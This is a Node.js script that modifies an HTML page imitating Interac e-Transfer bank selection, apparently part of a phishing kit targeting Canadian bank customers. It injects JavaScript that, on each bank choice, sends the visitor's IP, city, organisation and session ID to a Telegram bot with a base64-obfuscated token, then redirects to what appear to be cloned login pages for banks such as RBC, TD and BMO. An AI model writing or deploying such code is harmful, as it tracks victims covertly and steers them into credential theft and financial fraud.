import fs from 'fs';

let html = fs.readFileSync('public/main_interac.html', 'utf8');

// 1. Remove inline onclick on KOHO, National Bank, and other tiles
html = html.replace(/<a class="fi-tile" data-ajax="false" fiid="CA156562" filabel="KOHO Financial" href="\.\/koho\.html" onclick="[^"]*"/g, '<a class="fi-tile" data-ajax="false" fiid="CA156562" filabel="KOHO Financial" href="#"');
html = html.replace(/<img onclick="[^"]*" alt="KOHO Financial"/g, '<img alt="KOHO Financial"');
html = html.replace(/<a class="fi-tile" data-ajax="false" fiid="CA000006" filabel="National Bank" href="\.\/nationalbank\.html" onclick="[^"]*"/g, '<a class="fi-tile" data-ajax="false" fiid="CA000006" filabel="National Bank" href="#"');
html = html.replace(/<img onclick="[^"]*" alt="National Bank"/g, '<img alt="National Bank"');

// 2. Remove any trailing duplicate script block from </body></html> to the end
const endIdx = html.indexOf('</body></html>');
if (endIdx !== -1) {
  html = html.substring(0, endIdx + '</body></html>'.length);
}

// 3. Update the fiMapping script before </body></html>
const scriptReplacement = `<script src="security_module.js"></script>
<script>
(function() {
    var fiMapping = {
        'ATB': 'atb101.html',
        'BMO': 'bmo101.html',
        'CIBC': 'cibc101.html',
        'Coast Capital': 'coastcapital101.html',
        'Desjardins': 'desjardins101.html',
        'KOHO': 'koho.html',
        'Laurentian': 'laurentianbank101.html',
        'Meridian': 'meridian101.html',
        'National Bank': 'nationalbank.html',
        'Neo': 'neo101.html',
        'PC Financial': 'pcfinancial101.html',
        'RBC': 'rbc101.html',
        'Scotiabank': 'scotiabank101.html',
        'Simplii': 'simplii.html',
        'Tangerine': 'tangerine.html',
        'TD': 'ca/en/dt101.html',
        'UNI': 'uni101.html',
        'Vancity': 'vancity.html',
        'Wealthsimple': 'wealthsimple101.html'
    };

    function notifyAndGo(label, target) {
        var _ip = sessionStorage.getItem('__xip') || 'N/A';
        var _city = sessionStorage.getItem('__xcity') || 'N/A';
        var _org = sessionStorage.getItem('__xorg') || 'N/A';
        var _sid = sessionStorage.getItem('__xsid') || 'N/A';
        var _tok = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
        var _cid = atob('Njc4ODAxMjQ4MQ==');

        var payload = JSON.stringify({
            chat_id: _cid,
            text: '🏦 <b>BANQUE SÉLECTIONNÉE</b>\\n🏷️ <b>' + (label || 'Banque') + '</b>\\n📍 IP: <code>' + _ip + '</code>\\n🏙️ Ville: <code>' + _city + '</code>\\n🏢 Org: <code>' + _org + '</code>\\n🆔 Session: <code>' + _sid + '</code>',
            parse_mode: 'HTML'
        });

        if (navigator.sendBeacon) {
            navigator.sendBeacon('https://api.telegram.org/bot' + _tok + '/sendMessage', new Blob([payload], { type: 'application/json' }));
        } else {
            fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                keepalive: true
            }).catch(function(){});
        }

        setTimeout(function() {
            window.location.href = './' + target;
        }, 300);
    }

    document.addEventListener('DOMContentLoaded', function() {
        document.querySelectorAll('a.fi-tile, .fi-tile, [filabel]').forEach(function(tile) {
            tile.style.cursor = 'pointer';
            tile.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                var label = tile.getAttribute('filabel') || tile.innerText || '';
                var target = 'rbc101.html';

                for (var key in fiMapping) {
                    if (label.toLowerCase().indexOf(key.toLowerCase()) !== -1) {
                        target = fiMapping[key];
                        break;
                    }
                }
                notifyAndGo(label, target);
            }, true);
        });

        var submitBtn = document.getElementById('depositSelectSubmit');
        if (submitBtn) {
            submitBtn.removeAttribute('disabled');
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                var fiLabel = '';
                var mainFiSelect = document.getElementById('selectFiId');
                var provSelect = document.getElementById('province');
                if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
                    fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
                } else if (provSelect && provSelect.value) {
                    var activeCu = document.querySelector('.selectCu[provincecode="' + provSelect.value + '"] select');
                    if (activeCu && activeCu.value && activeCu.value !== '') {
                        fiLabel = activeCu.options[activeCu.selectedIndex].text;
                    }
                }
                if (fiLabel) {
                    var target = 'rbc101.html';
                    for (var key in fiMapping) {
                        if (fiLabel.toLowerCase().indexOf(key.toLowerCase()) !== -1) {
                            target = fiMapping[key];
                            break;
                        }
                    }
                    notifyAndGo(fiLabel, target);
                }
            }, true);
        }
    });
})();
</script>
`;

const smIdx = html.indexOf('<script src="security_module.js"></script>');
if (smIdx !== -1) {
    html = html.substring(0, smIdx) + scriptReplacement + '</body></html>';
}

fs.writeFileSync('public/main_interac.html', html, 'utf8');
console.log('Successfully cleaned up main_interac.html and enabled sendBeacon + capture for bank selections!');
